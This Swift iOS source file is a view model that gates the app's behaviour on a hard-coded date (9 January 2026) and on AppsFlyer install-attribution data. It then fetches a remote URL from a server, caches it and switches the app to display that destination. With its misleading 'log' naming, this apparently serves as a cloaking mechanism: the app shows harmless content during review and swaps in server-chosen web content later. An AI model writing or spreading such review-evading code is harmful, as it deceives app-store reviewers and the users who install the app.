import Foundation
import UserNotifications
import SwiftUI
import FirebaseMessaging
import Firebase
import Network
import AppsFlyerLib
import Combine

enum LogPhase {
    case bootstrapping, operational, deprecated, unreachable
}

class LogSupervisorViewModel: ObservableObject {
    @Published var ongoingLogPhase: LogPhase = .bootstrapping
    @Published var logDestination: URL?
    @Published var revealConsentDialog = false
    
    private var acquisitionMetrics: [String: Any] = [:]
    private var entryPointMetrics: [String: Any] = [:]
    private var disposers = Set<AnyCancellable>()
    private let linkageScanner = NWPathMonitor()
    
    private let phaseEvaluator: PhaseEvaluationUseCase
    private let consentChecker: ConsentVerificationUseCase
    private let organicRetriever: OrganicAcquisitionUseCase
    private let configFetcher: ConfigRetrievalUseCase
    private let cachedLoader: CachedDestinationUseCase
    private let endpointSaver: EndpointPersistenceUseCase
    private let deprecatedActivator: DeprecatedActivationUseCase
    private let consentSkipper: ConsentSkipUseCase
    private let consentApprover: ConsentApprovalUseCase
    
    private let appStateRepo: AppStateRepository
    private let permissionRepo: PermissionRepository
    private let deviceRepo: DeviceInfoRepository
    
    init(appStateRepo: AppStateRepository = AppStateRepositoryImpl(),
         permissionRepo: PermissionRepository = PermissionRepositoryImpl(),
         deviceRepo: DeviceInfoRepository = DeviceInfoRepositoryImpl(),
         phaseEvaluator: PhaseEvaluationUseCase = PhaseEvaluationUseCase(),
         consentChecker: ConsentVerificationUseCase = ConsentVerificationUseCase(),
         organicRetriever: OrganicAcquisitionUseCase = OrganicAcquisitionUseCase(),
         configFetcher: ConfigRetrievalUseCase = ConfigRetrievalUseCase(),
         cachedLoader: CachedDestinationUseCase = CachedDestinationUseCase(),
         endpointSaver: EndpointPersistenceUseCase = EndpointPersistenceUseCase(),
         deprecatedActivator: DeprecatedActivationUseCase = DeprecatedActivationUseCase(),
         consentSkipper: ConsentSkipUseCase = ConsentSkipUseCase(),
         consentApprover: ConsentApprovalUseCase = ConsentApprovalUseCase()) {
        
        self.appStateRepo = appStateRepo
        self.permissionRepo = permissionRepo
        self.deviceRepo = deviceRepo
        self.phaseEvaluator = phaseEvaluator
        self.consentChecker = consentChecker
        self.organicRetriever = organicRetriever
        self.configFetcher = configFetcher
        self.cachedLoader = cachedLoader
        self.endpointSaver = endpointSaver
        self.deprecatedActivator = deprecatedActivator
        self.consentSkipper = consentSkipper
        self.consentApprover = consentApprover
        
        initializeLinkageScanner()
        initializeFallbackTimer()
    }
    
    deinit {
        linkageScanner.cancel()
    }
    
    func manageAcquisitionMetrics(_ metrics: [String: Any]) {
        acquisitionMetrics = metrics
        revisePhase()
    }
    
    func manageEntryPointMetrics(_ metrics: [String: Any]) {
        entryPointMetrics = metrics
    }
    
    private func initializeFallbackTimer() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 30.0) {
            if self.acquisitionMetrics.isEmpty && self.entryPointMetrics.isEmpty && self.ongoingLogPhase == .bootstrapping {
                self.deprecatedActivator.execute()
                self.designatePhase(.deprecated)
            }
        }
    }
    
    private func isOperationalPeriod() -> Bool {
        let dateElements = DateComponents(year: 2026, month: 1, day: 9)
        if let thresholdDate = Calendar.current.date(from: dateElements) {
            return Date() >= thresholdDate
        }
        return false
    }
    
    @objc private func revisePhase() {
        if !isOperationalPeriod() {
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                self.deprecatedActivator.execute()
                self.designatePhase(.deprecated)
            }
            return
        }
        
        if acquisitionMetrics.isEmpty {
            if let storedDest = cachedLoader.execute() {
                logDestination = storedDest
                designatePhase(.operational)
            } else {
                deprecatedActivator.execute()
                designatePhase(.deprecated)
            }
            return
        }
        
        if appStateRepo.retrieveAppCondition() == "Inactive" {
            deprecatedActivator.execute()
            designatePhase(.deprecated)
            return
        }
        
        let assessedPhase = phaseEvaluator.execute(acquisitionMetrics: acquisitionMetrics,
                                                  isInitial: appStateRepo.isInitialExecution,
                                                  provisionalUrl: UserDefaults.standard.string(forKey: "temp_url"))
        
        if assessedPhase == .bootstrapping && appStateRepo.isInitialExecution {
            commenceBootstrapping()
            return
        }
        
        if let provisionalStr = UserDefaults.standard.string(forKey: "temp_url"),
           let provisionalDest = URL(string: provisionalStr),
           logDestination == nil {
            logDestination = provisionalDest
            designatePhase(.operational)
            return
        }
        
        if logDestination == nil {
            if consentChecker.execute() {
                revealConsentDialog = true
            } else {
                invokeConfigAcquisition()
            }
        }
    }
    
    func manageConsentSkip() {
        consentSkipper.execute()
        revealConsentDialog = false
        invokeConfigAcquisition()
    }
    
    func manageConsentApproval() {
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { [weak self] consented, _ in
            DispatchQueue.main.async {
                guard let self else { return }
                self.consentApprover.execute(consented: consented)
                if consented {
                    UIApplication.shared.registerForRemoteNotifications()
                }
                self.revealConsentDialog = false
                if self.logDestination != nil {
                    self.designatePhase(.operational)
                } else {
                    self.invokeConfigAcquisition()
                }
            }
        }
    }
    
    private func commenceBootstrapping() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            Task { [weak self] in
                await self?.acquireOrganicMetrics()
            }
        }
    }
    
    private func designatePhase(_ phase: LogPhase) {
        ongoingLogPhase = phase
    }
    
    private func acquireOrganicMetrics() async {
        do {
            let unifiedMetrics = try await organicRetriever.execute(entryMetrics: entryPointMetrics)
            acquisitionMetrics = unifiedMetrics
            invokeConfigAcquisition()
        } catch {
            deprecatedActivator.execute()
            designatePhase(.deprecated)
        }
    }
    
    private func initializeLinkageScanner() {
        linkageScanner.pathUpdateHandler = { [weak self] path in
            if path.status != .satisfied {
                DispatchQueue.main.async {
                    guard let self else { return }
                    if self.appStateRepo.retrieveAppCondition() == "LogView" {
                        self.designatePhase(.unreachable)
                    } else {
                        self.deprecatedActivator.execute()
                        self.designatePhase(.deprecated)
                    }
                }
            }
        }
        linkageScanner.start(queue: .global())
    }
    
    private func invokeConfigAcquisition() {
        Task { [weak self] in
            do {
                guard let self else { return }
                let acquiredDest = try await configFetcher.execute(acquisitionMetrics: self.acquisitionMetrics)
                let destStr = acquiredDest.absoluteString
                self.endpointSaver.execute(destinationStr: destStr, resolvedDest: acquiredDest)
                if self.consentChecker.execute() {
                    self.logDestination = acquiredDest
                    self.revealConsentDialog = true
                } else {
                    self.logDestination = acquiredDest
                    self.designatePhase(.operational)
                }
            } catch {
                if let storedDest = self?.cachedLoader.execute() {
                    self?.logDestination = storedDest
                    self?.designatePhase(.operational)
                } else {
                    self?.deprecatedActivator.execute()
                    self?.designatePhase(.deprecated)
                }
            }
        }
    }
}

struct DestinationAssembler {
    private var programId = ""
    private var authKey = ""
    private var hardwareId = ""
    private let foundationUrl = "https://gcdsdk.appsflyer.com/install_data/v4.0/"
    
    func configureProgramId(_ id: String) -> Self { duplicate(programId: id) }
    func configureAuthKey(_ key: String) -> Self { duplicate(authKey: key) }
    func configureHardwareId(_ id: String) -> Self { duplicate(hardwareId: id) }
    
    func compile() -> URL? {
        guard !programId.isEmpty, !authKey.isEmpty, !hardwareId.isEmpty else { return nil }
        var elements = URLComponents(string: foundationUrl + "id" + programId)!
        elements.queryItems = [
            URLQueryItem(name: "devkey", value: authKey),
            URLQueryItem(name: "device_id", value: hardwareId)
        ]
        return elements.url
    }
    
    private func duplicate(programId: String = "", authKey: String = "", hardwareId: String = "") -> Self {
        var replica = self
        if !programId.isEmpty { replica.programId = programId }
        if !authKey.isEmpty { replica.authKey = authKey }
        if !hardwareId.isEmpty { replica.hardwareId = hardwareId }
        return replica
    }
}


protocol PermissionRepository {
    func updateFinalConsentTime(_ time: Date)
    func approveConsent(_ approved: Bool)
    func declineConsent(_ declined: Bool)
    func isConsentApproved() -> Bool
    func isConsentDeclined() -> Bool
    func retrieveFinalConsentTime() -> Date?
}


enum LogFault: Error {
    case destinationAssemblyError
    case replyValidationError
    case infoParsingError
    case dataSerializationError
}

